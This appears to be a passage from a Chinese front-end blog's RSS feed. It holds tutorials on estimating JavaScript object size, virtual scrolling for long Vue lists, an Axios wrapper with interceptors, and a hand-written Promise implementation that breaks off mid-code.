b: <span class="string">&#x27;ccc&#x27;</span>,</span><br><span class="line">  <span class="number">222</span>: <span class="literal">false</span>,</span><br><span class="line">  c: same,</span><br><span class="line">  d: same,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> seen = <span class="keyword">new</span> <span class="built_in">WeakSet</span>()</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sizeOfObj</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj === <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> bytes = <span class="number">0</span></span><br><span class="line">  <span class="comment">// 对象里的key也是占用内存空间的</span></span><br><span class="line">  <span class="keyword">const</span> props = <span class="built_in">Object</span>.keys(obj)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; props.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> key = props[i]</span><br><span class="line">    <span class="comment">// 无论value是否重复，都需要计算key</span></span><br><span class="line">    bytes += calculator(key)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; obj[key] !== <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 这里需要注意value使用相同内存空间（只需计算一次内存）</span></span><br><span class="line">      <span class="keyword">if</span> (seen.has(obj[key])) <span class="keyword">continue</span></span><br><span class="line">      seen.add(obj[key])</span><br><span class="line">    &#125;</span><br><span class="line">    bytes += calculator(obj[key])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> bytes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calculator</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> objType = <span class="keyword">typeof</span> obj</span><br><span class="line">  <span class="keyword">switch</span> (objType) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;string&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> obj.length * <span class="number">2</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;boolean&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;number&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">8</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;object&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(obj)) &#123;</span><br><span class="line">        <span class="comment">// 数组处理 [1,2] [&#123;x:1&#125;,&#123;y:2&#125;]</span></span><br><span class="line">        <span class="keyword">return</span> obj.map(calculator).reduce(<span class="function">(<span class="params">res, cur</span>) =&gt;</span> res + cur, <span class="number">0</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 对象处理</span></span><br><span class="line">        <span class="keyword">return</span> sizeOfObj(obj)</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(calculator(testData)) <span class="comment">// 32</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;实现-sizeOf-函数，传入一个-object，计算这个-Object-占用了多少个-bytes&quot;&gt;&lt;a href=&quot;#实现-sizeOf-函数，传入一个-object，计算这个-Object-占用了多少个-bytes&quot; class=&quot;headerlink&quot; title=&quot;实现 sizeOf 函数，传入一个 object，计算这个 Object 占用了多少个 bytes&quot;&gt;&lt;/a&gt;实现 sizeOf 函数，传入一个 object，计算这个 Object 占用了多少个 bytes&lt;/h2&gt;&lt;p&gt;可以参考：&lt;a href=&quot;https://github.com/miktam/sizeof&quot;&gt;https://github.com/miktam/sizeof&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Number：一个数字 8 字节（64 位存储）&lt;/li&gt;
&lt;li&gt;String：一个字符 2 字节&lt;/li&gt;
&lt;li&gt;Boolean：4 个字节&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="字节数" scheme="http://llmysnow.top/tags/%E5%AD%97%E8%8A%82%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>Vue 大量数据展示 卡顿解决方案（滚动展示）</title>
    <link href="http://llmysnow.top/posts/b05a9b29/"/>
    <id>http://llmysnow.top/posts/b05a9b29/</id>
    <published>2021-05-13T08:03:22.701Z</published>
    <updated>2021-05-26T01:29:13.545Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需求分析（长列表展示）"><a href="#需求分析（长列表展示）" class="headerlink" title="需求分析（长列表展示）"></a>需求分析（长列表展示）</h2><p>页面某处需要渲染 <strong>1w+</strong> 条数据，并需要<strong>滚动展示</strong>，这时如果直接把这些数据渲染到页面上，会导致系统内存大量被占用，导致页面卡顿或崩溃</p><p>我们都知道，每次 DOM 修改，浏览器都会重新计算元素布局，再重新渲染（回流 / 重绘）。如果数据量很大，页面计算时间就会加成，造成页面卡顿</p><a id="more"></a><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul><li>根源：DOM 元素太多</li><li>思路：限制元素数量 / 虚拟DOM</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/bigData.gif"></p><p>后台数据格式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        checked: <span class="number">0</span>，</span><br><span class="line">        data: <span class="string">&quot;xxx&quot;</span>，</span><br><span class="line">        label: <span class="string">&quot;xxx&quot;</span>，</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>Vue 中就有一个现成的轮子可以解决这个问题：<a href="https://github.com/Akryum/vue-virtual-scroller#recyclescroller">vue-virtual-scroller</a></p><ol><li>安装 <code>vue-virtual-scroller</code> 插件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save vue-virtual-scroller</span><br></pre></td></tr></table></figure><ol start="2"><li>在 <code>main.js</code> 引入</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意：别忘了引用这个css</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;vue-virtual-scroller/dist/vue-virtual-scroller.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; RecycleScroller &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-virtual-scroller&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.component(<span class="string">&#x27;RecycleScroller&#x27;</span>, RecycleScroller)</span><br></pre></td></tr></table></figure><ol start="3"><li>在组件里使用<ul><li><code>items</code>：呈现数据</li><li><code>item-size</code>：呈现数据的大小 / 高度</li><li><code>key-filed</code>：如果 <code>items</code> 是对象，需要用这个做唯一标识</li></ul></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;RecycleScroller</span><br><span class="line">  style=&quot;height: 200px; overflow: auto&quot;</span><br><span class="line">  class=&quot;scroller&quot;</span><br><span class="line">  :items=&quot;listItem&quot;</span><br><span class="line">  :item-size=&quot;20&quot;</span><br><span class="line">  key-field=&quot;data&quot;</span><br><span class="line">&gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot</span>=<span class="string">&quot;&#123; item &#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-checkbox</span> <span class="attr">:key</span>=<span class="string">&quot;item.data&quot;</span> <span class="attr">:label</span>=<span class="string">&quot;item.label&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">RecycleScroller</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line">            listItem: []</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用  <code>vue-virtual-scroller</code> 插件展示大量数据，是可以比较流畅的渲染 / 滚动的</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;需求分析（长列表展示）&quot;&gt;&lt;a href=&quot;#需求分析（长列表展示）&quot; class=&quot;headerlink&quot; title=&quot;需求分析（长列表展示）&quot;&gt;&lt;/a&gt;需求分析（长列表展示）&lt;/h2&gt;&lt;p&gt;页面某处需要渲染 &lt;strong&gt;1w+&lt;/strong&gt; 条数据，并需要&lt;strong&gt;滚动展示&lt;/strong&gt;，这时如果直接把这些数据渲染到页面上，会导致系统内存大量被占用，导致页面卡顿或崩溃&lt;/p&gt;
&lt;p&gt;我们都知道，每次 DOM 修改，浏览器都会重新计算元素布局，再重新渲染（回流 / 重绘）。如果数据量很大，页面计算时间就会加成，造成页面卡顿&lt;/p&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="滚动展示" scheme="http://llmysnow.top/tags/%E6%BB%9A%E5%8A%A8%E5%B1%95%E7%A4%BA/"/>
    
    <category term="大数据" scheme="http://llmysnow.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Axios 二次封装</title>
    <link href="http://llmysnow.top/posts/84a23fec/"/>
    <id>http://llmysnow.top/posts/84a23fec/</id>
    <published>2021-05-06T08:45:20.419Z</published>
    <updated>2021-05-26T01:25:22.098Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>目的：把当前项目中，所有请求的公共部分进行统一处理</p></blockquote><ul><li><code>axios.defaults</code> 设置公共的配置项</li><li><code>axios.interceptors</code> 基于拦截器做统一处理</li></ul><a id="more"></a><p>配置请求接口的统一前缀</p><ul><li>开发 <code>development</code></li><li>测试 <code>test</code></li><li>灰度 <code>grayscale</code></li><li>生成 <code>production</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Qs <span class="keyword">from</span> <span class="string">&#x27;qs&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;@/router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; Message &#125; <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Cookies <span class="keyword">from</span> <span class="string">&#x27;js-cookie&#x27;</span></span><br><span class="line"></span><br><span class="line">axios.defaults.baseURL =</span><br><span class="line">  process.env.NODE_ENV === <span class="string">&#x27;development&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27;http://127.0.0.1:9999&#x27;</span></span><br><span class="line">axios.defaults.withCredentials = <span class="literal">true</span> <span class="comment">// 设置跨域请求中是否携带资源凭证</span></span><br><span class="line">axios.defaults.timeout = <span class="number">1000</span></span><br><span class="line">axios.defaults.headers.post[<span class="string">&#x27;Content-Type&#x27;</span>] =</span><br><span class="line">  <span class="string">&#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;</span> <span class="comment">// 配置公共的自定义请求头信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// POST系列请求对于请求主体信息的统一格式化</span></span><br><span class="line">axios.defaults.transformRequest = <span class="function"><span class="keyword">function</span> (<span class="params">data, headers</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (data === <span class="literal">null</span> || <span class="keyword">typeof</span> data !== <span class="string">&#x27;object&#x27;</span>) <span class="keyword">return</span> data</span><br><span class="line">  <span class="keyword">let</span> contentType = headers[<span class="string">&#x27;Content-Type&#x27;</span>] || headers.post[<span class="string">&#x27;Content-Type&#x27;</span>]</span><br><span class="line">  <span class="keyword">if</span> (contentType.includes(<span class="string">&#x27;urlencoded&#x27;</span>)) <span class="keyword">return</span> Qs.stringify(data)</span><br><span class="line">  <span class="keyword">if</span> (contentType.includes(<span class="string">&#x27;json&#x27;</span>)) <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(data)</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置响应状态码的校验处理&#123;状态码哪些是算请求成功，哪些算失败&#125;</span></span><br><span class="line">axios.defaults.validateStatus = <span class="function"><span class="keyword">function</span> (<span class="params">status</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> status &gt;= <span class="number">200</span> &amp;&amp; status &lt; <span class="number">400</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求拦截器，在向服务器发送请求之前，拦截到现有的配置，再去做一些统一修改</span></span><br><span class="line">axios.interceptors.request.use(</span><br><span class="line">  config =&gt; &#123;</span><br><span class="line">    <span class="comment">// 是否需要设置 token</span></span><br><span class="line">    <span class="keyword">const</span> token = Cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">      config.headers[<span class="string">&#x27;Authorization&#x27;</span>] = token</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error) <span class="comment">// for debug</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 响应拦截器，当前请求有结果之后，做一些成功或者失败的统一提示处理等...</span></span><br><span class="line">axios.interceptors.response.use(</span><br><span class="line">  response =&gt; &#123;</span><br><span class="line">    <span class="comment">// 服务器正常返回结果 &amp; validateStatus状态码校验成功</span></span><br><span class="line">    <span class="keyword">return</span> response.data</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; &#123;</span><br><span class="line">    <span class="comment">// 取消请求也会在这里拦截到</span></span><br><span class="line">    <span class="keyword">if</span> (error.message === <span class="string">&#x27;取消请求&#x27;</span>) <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(<span class="string">&#x27;取消请求&#x27;</span>)</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    失败情况：</span></span><br><span class="line"><span class="comment">    1.服务器返回了结果但是状态码没有经过validateStatus校验</span></span><br><span class="line"><span class="comment">    2.服务器压根没有返回任何的结果</span></span><br><span class="line"><span class="comment">    3.请求中断或者超时</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">let</span> response = error.response</span><br><span class="line">    <span class="keyword">if</span> (response) &#123;</span><br><span class="line">      <span class="comment">// @1</span></span><br><span class="line">      <span class="keyword">switch</span> (response.status) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">401</span>:</span><br><span class="line">          router.push(&#123; <span class="attr">path</span>: <span class="string">&#x27;/login&#x27;</span> &#125;)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">500</span>:</span><br><span class="line">          router.push(&#123; <span class="attr">path</span>: <span class="string">&#x27;/login&#x27;</span> &#125;)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">      &#125;</span><br><span class="line">      Message(&#123;</span><br><span class="line">        message: <span class="string">&#x27;访问失败，请联系系统管理员&#x27;</span>,</span><br><span class="line">        type: <span class="string">&#x27;warning&#x27;</span>,</span><br><span class="line">        duration: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (error &amp;&amp; error.code === <span class="string">&#x27;ECONNABORTED&#x27;</span>) &#123;</span><br><span class="line">        Message(&#123;</span><br><span class="line">          message: <span class="string">&#x27;服务器拒绝了您的请求&#x27;</span>,</span><br><span class="line">          type: <span class="string">&#x27;warning&#x27;</span>,</span><br><span class="line">          duration: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!navigator.onLine) &#123;</span><br><span class="line">        Message(&#123;</span><br><span class="line">          message: <span class="string">&#x27;设备已离线&#x27;</span>,</span><br><span class="line">          type: <span class="string">&#x27;warning&#x27;</span>,</span><br><span class="line">          duration: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> axios</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;目的：把当前项目中，所有请求的公共部分进行统一处理&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;axios.defaults&lt;/code&gt; 设置公共的配置项&lt;/li&gt;
&lt;li&gt;&lt;code&gt;axios.interceptors&lt;/code&gt; 基于拦截器做统一处理&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Axios" scheme="http://llmysnow.top/tags/Axios/"/>
    
    <category term="封装" scheme="http://llmysnow.top/tags/%E5%B0%81%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>手撕 Promise（内附then链实现）</title>
    <link href="http://llmysnow.top/posts/c7bac255/"/>
    <id>http://llmysnow.top/posts/c7bac255/</id>
    <published>2021-05-06T08:42:11.069Z</published>
    <updated>2021-05-26T01:27:12.431Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><h3 id="了解-Promise"><a href="#了解-Promise" class="headerlink" title="了解  Promise"></a>了解  Promise</h3><p>Promise 是一个异步操作返回的对象，用来传递异步操作的消息</p><p><strong>可以解决的问题</strong></p><ol><li>解决回调地狱问题，不会导致难以维护</li><li>合并多个异步请求，节约时间</li></ol><a id="more"></a><p><strong>Promise 的三种状态</strong></p><ol><li>Pending 等待态</li><li>Fulfilled 成功态</li><li>Rejected 失败态</li></ol><h3 id="使用-Promise"><a href="#使用-Promise" class="headerlink" title="使用 Promise"></a>使用 Promise</h3><p><strong>Promise.resolve：将现有对象转为 Promise 对象，这个对象处于 resolve 状态</strong></p><p>作用：</p><ul><li>改状态</li><li>发布事件池子里的方法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]).then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;); <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p><strong>Promise.reject：将现有对象转为 Promise 对象，这个对象处于 reject 状态</strong></p><p>作用：</p><ul><li>改状态</li><li>发布事件池子里的方法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.reject([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]).then(<span class="literal">null</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;); <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p><strong>Promise.then：用来指定 Promise 对象的状态改变时要执行的操作</strong></p><ul><li>then 是同步的，then 里的回调函数是异步的</li></ul><p><strong>注意几点：</strong></p><ul><li>如果当前 then 中回调函数的执行结果是一个 Promise 实例，那当前这个实例的状态会接管下一个 then 中回调函数的执行</li><li>如果当前的 then 中的回调函数执行结果不是一个 Promise 实例，那下一个then中会默认执行成功的回调函数</li><li>当 Promise 的回调函数执行的时候出现了错误，那当前的实例会变成失败态</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    resolve(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="comment">//reject(&#x27;fail&#x27;);</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;data：&quot;</span>, data);</span><br><span class="line">    &#125;,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;err：&quot;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>Promise.all：接收一个数组，数组内是 Promise 实例。必须全部成功才表示成功</strong></p><p><strong>Promise.race：接收一个数组，数组内是 Promise 实例。最早返回的对象成功，就变成成功态；如果失败了，就变成失败态</strong></p><h2 id="封装-Promise"><a href="#封装-Promise" class="headerlink" title="封装 Promise"></a>封装 Promise</h2><p>Promise 是一个 ES6 的内置类</p><ul><li>当 new Promise 的时候，会给当前实例增加状态（默认是 pending 等待态）和两个事件池（成功和失败的事件池）</li><li>还会给 Promise 的内部传递一个 executor 函数，此函数会立即执行，而且此函数会传递两个形参函数 resolve 和 reject，形参对应的实参函数在 Promise 内部，当执行任何一个函数的时候，都会做两件事<ol><li>去改变当前 Promise 实例的状态（<strong>改状态</strong>）</li><li><strong>发布对应池子里的事件</strong></li></ol></li><li>Promise 的类的原型上还有一个 then 方法，用来给当前的 Promise 实例的事件池子订阅方法，而且还会返回一个新的 Promise 实例</li></ul><h3 id="不考虑-then-链式调用"><a href="#不考虑-then-链式调用" class="headerlink" title="不考虑 then 链式调用"></a>不考虑 then 链式调用</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">executor</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.state = <span class="string">&quot;pending&quot;</span>;</span><br><span class="line">        <span class="comment">// Promise实例可以多次then，为了保证then中方法按顺序执行，这里把then中成功的回调和失败的回调存放到数组内</span></span><br><span class="line">        <span class="built_in">this</span>.fulfilledEvent = [];</span><br><span class="line">        <span class="built_in">this</span>.rejectedEvent = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> resolve = <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.state !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">this</span>.state = <span class="string">&quot;resolved&quot;</span>;</span><br><span class="line">            <span class="comment">// resolve其实是一个微任务，这里宏任务替换一下</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">// 发布方法</span></span><br><span class="line">                <span class="built_in">this</span>.fulfilledEvent.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                        item(result);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;, <span class="number">0</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">let</span> reject = <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.state !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">this</span>.state = <span class="string">&quot;rejected&quot;</span>;</span><br><span class="line">            